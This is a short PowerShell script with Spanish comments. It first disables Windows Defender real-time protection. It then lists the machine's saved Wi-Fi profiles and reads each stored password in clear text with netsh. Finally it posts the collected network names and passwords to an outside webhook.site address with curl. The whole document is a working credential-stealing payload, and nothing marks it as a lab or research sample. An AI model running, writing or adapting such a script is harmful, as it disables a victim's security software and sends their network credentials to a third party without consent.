# 1. Desactivar Defender
Set-MpPreference -DisableRealtimeMonitoring $true -EA 0

# 2. Pausa necesaria para que Windows no bloquee el socket de red
Start-Sleep -s 3

# 3. Extraer perfiles (Optimizado para Inglés)
$profiles = (netsh wlan show profiles | Select-String "\:(.+)$").Matches.Groups[1].Value.Trim() | Where-Object { $_ -notmatch "Profile" }

$wifiData = foreach ($n in $profiles) {
    $res = netsh wlan show profile name="$n" key=clear
    $pass = ($res | Select-String "Key Content\W+:(.+)$").Matches.Groups[1].Value.Trim()
    if ($pass) { "SSID: $n | Pass: $pass" }
}

# 4. Enviar usando CURL (Más robusto en Win11)
if ($wifiData) {
    $payload = $wifiData -join "`n"
    # El uso de curl evita errores de certificados y sesiones de PowerShell
    curl.exe -X POST -d "$payload" "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c"
}
